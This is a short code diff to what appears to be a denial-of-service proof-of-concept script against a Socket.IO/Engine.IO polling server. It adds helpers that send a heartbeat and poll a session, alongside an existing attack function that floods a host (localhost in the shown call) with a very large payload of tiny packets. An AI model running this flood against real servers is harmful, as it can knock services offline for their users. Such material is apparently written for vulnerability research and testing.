@@ -80,5 +80,23 @@ def attack(host, payload_length=100000000, make_payload=many_tiny_packets):
         print("Duration:", int(time.time() - start_time))
 
 
+def send_one_heartbeat(host, sid):
+    session_url = host + "/socket.io/?EIO=3&transport=polling&sid=" + sid
+    final_response = requests.post(
+        session_url + timestr(),
+        data='1:2',
+        headers={'Content-Type': 'text/plain'},
+    ).text
+    print("Server returned", repr(final_response))
+
+
+def get_responses(host, sid):
+    session_url = host + "/socket.io/?EIO=3&transport=polling&sid=" + sid
+    final_response = requests.get(
+        session_url + timestr(),
+    ).text
+    print("Server returned", repr(final_response))
+
+
 def x(payload_length=100000000, make_payload=many_tiny_packets):
     return attack("http://127.0.0.1:5000", payload_length, make_payload)
